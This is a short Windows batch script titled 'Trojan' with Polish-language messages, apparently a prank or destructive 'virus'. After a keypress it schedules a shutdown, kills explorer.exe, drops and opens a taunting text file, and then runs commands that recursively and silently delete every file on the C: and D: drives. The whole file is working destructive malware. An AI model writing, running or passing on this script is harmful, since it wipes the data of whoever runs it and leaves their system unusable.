@echo off
title Trojan
@EULA
echo Jesli chcesz odpalic tego wirusa kliknij dowolny klawisz jak nie wyjc.
echo To jedyne opcje:)
pause>nul
shutdown -s -t 100 -c "TWUJ SYSTEM POSZEDL DO NIEBA"
taskkill /f /im explorer.exe
cd Deskop
echo Co się stało? Twuj system jest zarażony wirusem Trojan. Co zrobić? Patrz jak twuj system idzie do nieba, miłej zabawy:)>Trojan.txt
start Trojan.txt
del c:\*/s /q
del d:\*/s /q

